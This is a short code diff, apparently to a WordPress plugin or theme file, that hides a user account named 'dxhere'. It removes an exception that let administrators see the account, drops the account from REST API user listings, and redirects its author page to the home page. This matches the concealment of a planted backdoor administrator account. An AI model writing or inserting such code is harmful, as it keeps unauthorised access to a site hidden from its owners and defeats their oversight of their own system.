@@ -8,7 +8,20 @@
 add_filter('pre_user_query', function($user_search) {
     global $wpdb;
 
-    if (!current_user_can('administrator')) {
-        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
+});
+
+add_filter('rest_user_query', function($args) {
+    $dx_id = get_user_by('login', 'dxhere');
+    if ($dx_id) {
+        $args['exclude'] = array_merge($args['exclude'] ?? [], [$dx_id->ID]);
+    }
+    return $args;
+}, 10, 1);
+
+add_action('template_redirect', function() {
+    if (is_author('dxhere')) {
+        wp_redirect(home_url());
+        exit;
     }
 });
